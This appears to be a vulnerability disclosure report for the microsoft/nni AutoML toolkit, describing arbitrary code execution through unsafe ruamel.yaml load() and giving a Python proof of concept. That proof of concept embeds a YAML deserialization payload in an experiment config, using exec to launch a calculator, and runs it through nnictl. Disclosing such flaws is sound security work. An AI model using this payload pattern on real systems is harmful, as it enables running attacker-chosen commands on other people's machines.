# Description
**Arbitrary Code Excecution** in microsoft/nni.
An open source AutoML toolkit for automate machine learning lifecycle, including feature engineering, neural architecture search, model compression and hyper-parameter tuning.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **ruamel.yaml**
# Exploit code
**Python File**
```python
import os 

os.system('pip3 install nni')
exploit = """authorName: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
experimentName: example_mnist_pytorch
trialConcurrency: 1
maxExecDuration: 1h
maxTrialNum: 10
#choice: local, remote, pai
trainingServicePlatform: local
searchSpacePath: search_space.json
#choice: true, false
useAnnotation: false
tuner:
  #choice: TPE, Random, Anneal, Evolution, BatchTuner, MetisTuner, GPTuner
  #SMAC (SMAC should be installed through nnictl)
  builtinTunerName: TPE
  classArgs:
    #choice: maximize, minimize
    optimize_mode: maximize
trial:
  command: python3 mnist.py
  codeDir: .
  gpuNum: 0
"""
open('exploit.yml','w+').write(exploit)
os.system('nnictl create --config exploit.yml')
os.system('rm exploit.yml')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/785677515892981800/Screenshot_from_2020-12-08_06-50-12.png)
![](https://cdn.discordapp.com/attachments/749019614352244777/785677507818160198/Screenshot_from_2020-12-08_06-50-19.png)

